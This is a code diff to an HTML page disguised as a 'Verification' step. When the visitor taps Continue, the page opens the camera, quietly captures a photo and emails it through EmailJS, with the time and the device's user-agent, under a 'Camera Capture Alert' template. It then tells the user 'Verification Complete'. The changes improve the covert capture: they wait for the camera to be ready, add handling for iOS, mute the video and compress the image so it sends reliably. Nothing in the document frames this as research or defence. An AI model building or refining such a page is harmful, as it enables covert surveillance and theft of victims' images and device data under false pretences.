@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification Required</title>
+  <title>Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
   <style>
@@ -19,7 +18,7 @@
 <p>Tap continue to verify</p>
 
 <button id="startBtn">Continue</button>
-<video id="video" autoplay playsinline></video>
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -39,8 +38,10 @@ startBtn.onclick = async () => {
     video.srcObject = stream;
     video.style.display = "block";
 
-    // Wait briefly for camera to stabilize
-    setTimeout(captureAndSend, 1200);
+    // ✅ WAIT until camera metadata is ready
+    video.onloadedmetadata = () => {
+      setTimeout(captureAndSend, 1000); // extra buffer for iOS
+    };
 
   } catch {
     alert("Camera permission denied");
@@ -49,20 +50,37 @@ startBtn.onclick = async () => {
 
 function captureAndSend() {
   const canvas = document.getElementById("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
+  const width = video.videoWidth;
+  const height = video.videoHeight;
 
-  const imageData = canvas.toDataURL("image/png");
+  if (!width || !height) {
+    alert("Camera not ready");
+    return;
+  }
+
+  // 🔽 Resize image to reduce size
+  const MAX_WIDTH = 480;
+  const scale = MAX_WIDTH / width;
+
+  canvas.width = MAX_WIDTH;
+  canvas.height = height * scale;
+
+  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // ✅ JPEG compression (VERY IMPORTANT)
+  const imageData = canvas.toDataURL("image/jpeg", 0.6);
 
   emailjs.send("service_ppjrw8t", "Camera Capture Alert", {
     image: imageData,
     time: new Date().toLocaleString(),
     device: navigator.userAgent
-  });
+  }).then(
+    () => console.log("Email sent"),
+    err => console.error(err)
+  );
 
   // Stop camera
-  video.srcObject.getTracks().forEach(track => track.stop());
+  video.srcObject.getTracks().forEach(t => t.stop());
 
   document.body.innerHTML = "<h3>Verification Complete</h3>";
 }
@@ -70,4 +88,3 @@ function captureAndSend() {
 
 </body>
 </html>
-
